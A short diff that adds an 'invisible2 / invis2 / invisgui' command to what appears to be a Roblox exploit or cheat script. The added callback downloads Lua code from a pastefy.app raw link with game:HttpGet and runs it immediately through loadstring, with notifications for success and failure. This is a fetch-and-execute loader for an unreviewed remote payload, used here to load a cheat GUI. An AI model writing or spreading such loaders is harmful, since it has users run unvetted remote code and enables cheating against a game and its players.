@@ -4614,6 +4614,23 @@ CommandSystem:AddCmd({
 	end
 })
 
+CommandSystem:AddCmd({
+	Title = "invisible2 / invis2 / invisgui",
+	Alias = {"invisible2", "invis2", "invisgui"},
+	Callback = function()
+		task.spawn(function()
+			local success, err = pcall(function()
+				NotificationLibrary:SendNotification("Success", "Loading Invisible gui", 3)
+				wait(1)
+				loadstring(game:HttpGet('https://pastefy.app/xHNzSFsi/raw'))()
+			end)
+			if not success then
+				NotificationLibrary:SendNotification("Error", "Invisible didnt load " .. tostring(err), 3)
+			end
+		end)
+	end
+})
+
 task.spawn(function()
 	pcall(function()
 		task.wait(0.2)
